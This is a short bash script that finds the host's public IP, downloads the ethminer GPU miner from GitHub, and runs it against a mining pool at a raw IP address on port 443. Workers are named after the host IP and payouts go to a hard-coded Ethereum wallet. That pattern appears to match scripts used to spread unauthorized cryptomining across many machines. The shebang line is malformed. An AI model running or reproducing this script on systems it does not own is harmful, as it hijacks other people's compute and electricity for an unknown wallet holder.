  
#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar -xzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
ls -la
./bin/ethminer -P stratum1+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.$IPNAME@116.203.206.127:443 -U --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
